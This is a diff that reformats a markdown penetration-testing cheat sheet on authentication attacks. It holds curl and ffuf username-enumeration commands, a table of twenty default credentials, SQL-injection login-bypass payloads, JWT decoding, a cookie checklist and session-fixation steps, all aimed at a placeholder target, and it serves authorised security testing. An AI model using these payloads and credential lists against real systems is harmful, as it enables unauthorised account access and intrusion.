@@ -13,7 +13,9 @@ signed_by: cyberstrike-official
 ## Username Enumeration Techniques
 
 ### Error Message Differentiation
+
 Test login, registration, and password reset with known vs unknown usernames:
+
 ```bash
 # Login form — compare responses
 curl -s -X POST https://TARGET/login -d "user=admin&pass=wrong" -o resp_valid.txt
@@ -34,6 +36,7 @@ curl -s -X POST https://TARGET/forgot -d "email=admin@TARGET"
 ```
 
 ### ffuf Enumeration
+
 ```bash
 ffuf -u https://TARGET/login -X POST -d "username=FUZZ&password=test" \
   -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
@@ -43,32 +46,33 @@ ffuf -u https://TARGET/login -X POST -d "username=FUZZ&password=test" \
 
 ## Default Credentials (Top 20)
 
-| Username | Password | Common On |
-|----------|----------|-----------|
-| admin | admin | Most apps |
-| admin | password | Most apps |
-| admin | admin123 | CMS, panels |
-| administrator | administrator | Windows, Java |
-| root | root | Linux, DBs |
-| root | toor | Kali, some DBs |
-| test | test | Dev environments |
-| guest | guest | Legacy systems |
-| user | user | Demo systems |
-| admin | "" (blank) | IoT, routers |
-| sa | "" (blank) | MSSQL |
-| postgres | postgres | PostgreSQL |
-| tomcat | tomcat | Apache Tomcat |
-| manager | manager | Tomcat, JBoss |
-| admin | changeme | Default installs |
-| admin | 123456 | Weak defaults |
-| cisco | cisco | Network devices |
-| admin | secret | Various |
-| operator | operator | Industrial systems |
-| pi | raspberry | Raspberry Pi |
+| Username      | Password      | Common On          |
+| ------------- | ------------- | ------------------ |
+| admin         | admin         | Most apps          |
+| admin         | password      | Most apps          |
+| admin         | admin123      | CMS, panels        |
+| administrator | administrator | Windows, Java      |
+| root          | root          | Linux, DBs         |
+| root          | toor          | Kali, some DBs     |
+| test          | test          | Dev environments   |
+| guest         | guest         | Legacy systems     |
+| user          | user          | Demo systems       |
+| admin         | "" (blank)    | IoT, routers       |
+| sa            | "" (blank)    | MSSQL              |
+| postgres      | postgres      | PostgreSQL         |
+| tomcat        | tomcat        | Apache Tomcat      |
+| manager       | manager       | Tomcat, JBoss      |
+| admin         | changeme      | Default installs   |
+| admin         | 123456        | Weak defaults      |
+| cisco         | cisco         | Network devices    |
+| admin         | secret        | Various            |
+| operator      | operator      | Industrial systems |
+| pi            | raspberry     | Raspberry Pi       |
 
 ## Authentication Bypass Payloads
 
 ### SQL Injection in Login
+
 ```
 admin' --
 admin' #
@@ -82,6 +86,7 @@ admin' OR '1'='1
 ```
 
 ### JWT Vulnerabilities
+
 ```bash
 # Decode JWT (no verification)
 echo "JWT_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
@@ -125,16 +130,17 @@ curl -sI https://TARGET/ | grep -i "set-cookie"
 
 ### Cookie Security Checklist
 
-| Attribute | Expected | Vulnerability |
-|-----------|----------|---------------|
-| Secure | Present | Token sent over HTTP |
-| HttpOnly | Present | XSS can steal cookie |
-| SameSite | Strict or Lax | CSRF attacks |
-| Path | Restrictive (/) | Scope too broad |
-| Domain | No leading dot | Subdomain access |
-| Expires/Max-Age | Reasonable timeout | Indefinite sessions |
+| Attribute       | Expected           | Vulnerability        |
+| --------------- | ------------------ | -------------------- |
+| Secure          | Present            | Token sent over HTTP |
+| HttpOnly        | Present            | XSS can steal cookie |
+| SameSite        | Strict or Lax      | CSRF attacks         |
+| Path            | Restrictive (/)    | Scope too broad      |
+| Domain          | No leading dot     | Subdomain access     |
+| Expires/Max-Age | Reasonable timeout | Indefinite sessions  |
 
 ## Session Fixation Test
+
 ```
 1. Note session token before login (pre-auth)
 2. Login with valid credentials
